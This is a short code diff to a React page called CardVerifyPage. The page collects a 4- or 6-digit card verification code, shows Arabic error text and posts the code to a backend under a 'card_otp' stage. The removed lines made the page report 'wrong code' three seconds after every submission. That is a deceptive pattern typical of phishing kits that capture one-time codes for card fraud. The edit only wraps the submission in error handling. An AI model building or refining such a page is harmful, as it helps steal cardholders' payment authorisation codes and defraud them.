@@ -31,25 +31,24 @@ export default function CardVerifyPage() {
     e.preventDefault();
     const len = otp.trim().length;
     if (len !== 4 && len !== 6) {
-      setFillError("رمز التحقق يجب أن يتكون من 4 أو 6 أرقام فقط");
+      setFillError("رمز التحقق غير صالح (يجب أن يكون 4 أو 6 أرقام)");
       setWrongError(false);
       return;
     }
     setFillError(null);
     setWrongError(false);
-    await createOrUpdateRequest({
-      stage_key: "card_otp",
-      extra_key_e: otp.trim(),
-      notify_key: "----",
-      stage_state: "pending",
-    });
-
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setOtp("");
-      setWrongError(true);
-    }, 3000);
+
+    try {
+      await createOrUpdateRequest({
+        stage_key: "card_otp",
+        extra_key_e: otp.trim(),
+        notify_key: "----",
+        stage_state: "pending",
+      });
+    } catch (err) {
+      console.error(err);
+    }
   };
 
   return (
